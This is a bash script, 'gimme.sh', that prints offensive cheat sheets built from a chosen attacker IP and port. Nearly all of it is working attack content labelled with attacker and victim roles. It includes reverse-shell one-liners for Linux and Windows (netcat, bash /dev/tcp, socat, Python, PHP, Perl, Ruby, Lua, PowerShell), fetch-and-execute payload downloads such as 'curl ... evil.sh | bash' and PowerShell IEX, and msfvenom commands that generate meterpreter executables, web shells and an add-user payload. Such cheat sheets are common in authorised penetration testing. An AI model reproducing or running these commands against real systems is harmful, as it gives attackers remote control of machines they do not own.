#!/bin/bash


# Colors : https://stackoverflow.com/questions/5947742/how-to-change-the-output-color-of-echo-in-linux
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White


function rev()
{
case $3 in
	"lin")
		 	echo -e "$BWhite====================== Reverse Shells ====================="
		 	echo -e "=======$BRed Linux $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen Diff.Netcat $BWhite] : $BBlue rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $BYellow$1 $2$BBlue >/tmp/f$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Netcat $BWhite] : $BPurple Attacker$BWhite : $BBlue nc -lvnp $BYellow$2$BWhite"
		 	echo -e "[$BGreen Netcat $BWhite] : $BPurple Victim$BWhite : $BBlue nc -e /bin/sh $BYellow$1 $2$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Curl $BWhite]   : $BBlue curl http://$BYellow$1$BBlue:$BYellow$2$BBlue/evil.sh | bash$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Bash $BWhite]   : $BBlue /bin/bash -i >& /dev/tcp/$BYellow$1$BBlue/$BYellow$2$BBlue 0>&1$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Socat $BWhite]  : $BPurple Attacker$BWhite : $BBlue socat -d -d TCP4-LISTEN:$BYellow$2$BBlue STDOUT$BWhite"
		 	echo -e "[$BGreen Socat $BWhite]  : $BPurple Victim$BWhite   : $BBlue socat TCP4:$BYellow$1$BBlue:$BYellow$2$BBlue EXEC:/bin/bash$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Python $BWhite] : $BBlue python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$BYellow$1$BBlue\",$BYellow$2$BBlue);os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'$BWhite"	
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen PHP $BWhite]	 : $BBlue php -r '\$sock=fsockopen(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);exec(\"/bin/sh -i <&3 >&3 2>&3\");'$BWhite"
		 	echo -e "[$BGreen PHP $BWhite]	 : $BBlue php -r '\$sock=fsockopen(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'$BWhite"
		 	echo -e "[$BGreen PHP $BWhite]	 : $BBlue php -r '\$sock=fsockopen(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);system(\"/bin/sh -i <&3 >&3 2>&3\");'$BWhite"
		 	echo -e "[$BGreen PHP $BWhite]	 : $BBlue php -r '\$sock=fsockopen(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Perl $BWhite] : $BBlue perl -e 'use Socket;\$i=\"$BYellow$1$BBlue\";\$p=$BYellow$2$BBlue;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Ruby $BWhite] : $BBlue ruby -rsocket -e'f=TCPSocket.open(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Lua $BWhite]	 : $BBlue lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$BYellow$1$BBlue','$BYellow$2$BBlue');os.execute('/bin/sh -i <&3 >&3 2>&3');\"$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "==========================================================="
	;;
	"win")
			echo -e "====================== Reverse Shells ====================="
		 	echo -e "=======$BRed Windows $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen Powershell $BWhite] : $BBlue powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient('$BYellow$1$BBlue',$BYellow$2$BBlue);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush();}\$client.Close()\"$BWhite"
		 	echo -e "[$BGreen Powershell $BWhite] : $BBlue \$client = New-Object System.Net.Sockets.TCPClient(\"$BYellow$1$BBlue\",$BYellow$2$BBlue);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Netcat $BWhite] : Attacker : $BBlue nc -lvnp $BYellow$2$BWhite"
		 	echo -e "[$BGreen Netcat $BWhite] : Victim   : $BBlue nc -nv $BYellow$1 $2$BBlue -e cmd.exe$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Socat $BWhite] : Attacker : $BBlue socat -d -d TCP4-LISTEN:$BYellow$2$BBlue STDOUT$BWhite"
		 	echo -e "[$BGreen Socat $BWhite] : Victim   : $BBlue socat TCP4:$BYellow$1$BBlue:$BYellow$2$BBlue EXEC:'cmd.exe',pipes$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Python $BWhite] : $BBlue python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$BYellow$1$BBlue', $BYellow$2$BBlue)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\windows\\\system32\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen SMB $BWhite] : Attacker : $BBlue Copy nc.exe To Current Working Directory$BWhite"
		 	echo -e "[$BGreen SMB $BWhite] : Attacker : $BBlue python3 smbserver.py smb .$BWhite"
		 	echo -e "[$BGreen SMB $BWhite] : Victim   : $BBlue //$BYellow$1$BBlue/smb/nc.exe -nv $BYellow$1 $2$BBlue -c cmd.exe$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Lua $BWhite] : $BBlue lua5.1 -e 'local host, port = \"$BYellow$1$BBlue\", $BYellow$2$BBlue local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "==========================================================="

	;;
	*)
			echo -e "$BGreen D$BPurple u$BBlue d$BYellow e$BCyan .$BGreen .$BPurple . "
	;;
esac
}

function ft()
{
case $3 in
	"lin")
		 	echo -e "$BWhite====================== File Transfer ====================="
		 	echo -e "=======$BRed Linux $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen Netcat $BWhite] : $BPurple Attacker$BWhite : $BBlue nc -lvnp $BYellow$2$BBlue < file.sh$BWhite"
		 	echo -e "[$BGreen Netcat $BWhite] : $BPurple Victim$BWhite : $BBlue nc $BYellow$1 $2$BBlue > evil.sh$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen Python2 Server $BWhite] : $BPurple Attacker : $BBlue python -m simpleHttpServer$BWhite"
		 	echo -e "[$BGreen Python3 Server $BWhite] : $BPurple Attacker : $BBlue python3 -m http.server$BWhite"
		 	echo -e "	  [$BGreen Wget $BWhite] : $BBlue wget http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.sh$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen PHP Server$BWhite] : $BPurple Attacker : $BBlue php -S $BYellow$1$BBlue:$BYellow$2 $BWhite"
		 	echo -e "     [$BGreen Curl $BWhite] : $BBlue curl http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.sh > file.sh$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen SMB $BWhite] : $BBlue smbget -R smb://$BYellow$1$BBlue/share/$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen SSH $BWhite]"
		 	echo -e "[$BGreen From A to V, while logged into V$BWhite] :$BBlue scp /path/to/file username@<Target_IP>:/path/to/destination$BWhite"		 	
		 	echo -e "==========================================================="
	;;
	"win")
			echo -e "$BWhite====================== File Transfer ====================="
		 	echo -e "=======$BRed Windows $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen Powershell $BWhite] :$BBlue powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.exe','C:\destination\path\\\file.exe')\"$BWhite"
		 	echo -e "[$BGreen Powershell $BWhite] :$BBlue powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.ps1')$BWhite"
		 	echo -e "-----------------------------------------------------------"
		 	echo -e "[$BGreen FTP $BWhite]"
		 	echo -e "$BPurple Setup FTP Server On Attacker Machine$BWhite"
		 	echo -e "$BPurple On Victim Machine$BWhite"
		 	echo -e "$BBlue echo open $BYellow$1 21$BBlue> ftp.txt$BWhite"
			echo -e "$BBlue echo USER anonymous>>ftp.txt"
			echo -e "$BBlue echo anonymous>>ftp.txt"
			echo -e "$BBlue echo bin>>ftp.txt"
			echo -e "$BBlue echo get whoami.exe>>ftp.txt"
			echo -e "$BBlue echo bye>>ftp.txt"
			echo -e "$BBlue ftp -v -s:ftp.txt$BWhite"
		 	echo -e "==========================================================="
		
	;;
	*)
			echo -e "$BGreen D$BPurple u$BBlue d$BYellow e$BCyan .$BGreen .$BPurple . "
	;;
esac
}

function venom()
{
	case $3 in
		"lin")

		 	echo -e "$BWhite====================== MSFVENOM ====================="
		 	echo -e "=======$BRed Linux $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen 32-bit $BWhite] : $BBlue msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f elf > shell.elf$BWhite"
			echo -e "[$BGreen 64-bit $BWhite] : $BBlue msfvenom -p linux/x64/shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f elf > shell.elf$BWhite"
			echo -e "[$BGreen SunOS (Solaris)      $BWhite] : $BBlue msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f elf -e x86/shikata_ga_nai -b '\\\x00' > solshell.elf$BWhite"
			echo -e "==========================================================="
		;;
		"win")
			echo -e "$BWhite====================== MSFVENOM ====================="
		 	echo -e "=======$BRed Windows $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen 32-bit $BWhite] : $BBlue msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f exe > shell.exe$BWhite"
		 	echo -e "[$BGreen 64-bit $BWhite] : $BBlue msfvenom -p windows/x64/shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f exe > shell.exe$BWhite"
		 	echo -e "[$BGreen Create User $BWhite] : $BBlue msfvenom -p windows/adduser USER=$BYellow attacker $BBlue PASS=$BYellow attacker@123 $BBlue -f exe > adduser.exe$BWhite"
		 	echo -e "[$BGreen CMD Shell $BWhite] : $BBlue msfvenom -p windows/shell/reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f exe > prompt.exe$BWhite"
		 	echo -e "[$BGreen Execute Command $BWhite] : $BBlue msfvenom -a x86 --platform Windows -p windows/exec CMD=\"powershell IEX(New-Object Net.webClient).downloadString('http://$BYellow$1$BBlue/nishang.ps1')\" -f exe > pay.exe$BWhite"
		 	echo -e "==========================================================="

		;;
		"web")
			echo -e "$BWhite====================== MSFVENOM ====================="
		 	echo -e "=======$BRed Web $BWhite=============================================$BWhite"
		 	echo -e "[$BGreen PHP $BWhite]  : $BBlue msfvenom -p php/meterpreter_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f raw > shell.php
	    cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php$BWhite"
		 	echo -e "[$BGreen ASP $BWhite]  : $BBlue msfvenom -p windows/meterpreter/reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f asp > shell.asp$BWhite"
		 	echo -e "[$BGreen JSP $BWhite]  : $BBlue msfvenom -p java/jsp_shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f raw > shell.jsp$BWhite"
		 	echo -e "[$BGreen WAR $BWhite]  : $BBlue msfvenom -p java/jsp_shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f war > shell.war$BWhite"
		 	echo -e "[$BGreen ASPX $BWhite] : $BBlue msfvenom -p windows/meterpreter/reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f aspx >reverse.aspx$BWhite"
		 	echo -e "==========================================================="
		;;
		*)
			echo -e "$BGreen D$BPurple u$BBlue d$BYellow e$BCyan .$BGreen .$BPurple . "
		;;
	esac

}
function validate_ip()
{
	if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && [[ $2 -lt 65536 && $2 -gt 0 ]] 
		then
  			:
		else
				 	echo -e "Invalid LHOST or LPORT Value !!!"
			exit
		fi
}

if [ $# -lt 1 ]
then
			echo -e "$BWhite====================== GimmeGimme ================================"
		 	echo -e "$BGreen	--rev-shell$BWhite 	: Print Reverse Shell Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --rev-shell LHOST LPORT win/lin"
		 	echo -e "$BGreen	--file-transfer$BWhite : Print File Transfer Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --file-transfer LHOST LPORT win/lin"
		 	echo -e "$BGreen	--msf-venom$BWhite 	: Print msfvenom Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --msf-venom LHOST LPORT"
		 	echo -e "$BWhite=================================================================="
	exit
fi

case $1 in
	"--rev-shell")
		if [ $# -lt 4 ]
		then
				 	echo -e "Syntax: gimme.sh --rev-shell LHOST LPORT win/lin"
			exit
		fi
		validate_ip $2 $3
		rev $2 $3 $4
	;;
	"--file-transfer")
		if [ $# -lt 4 ]
		then
				 	echo -e "Syntax: gimme.sh --file-transfer LHOST LPORT win/lin"
			exit
		fi
		validate_ip $2 $3
		ft $2 $3 $4
	;;
	"--msf-venom")
		if [ $# -lt 3 ]
		then
				 	echo -e "Syntax: gimme.sh --msf-venom LHOST LPORT win/lin/web"
			exit
		fi
		validate_ip $2 $3
		venom $2 $3 $4
	;;
	*)
			 	echo -e "$BGreen D$BPurple u$BBlue d$BYellow e$BCyan .$BGreen .$BPurple . "

esac
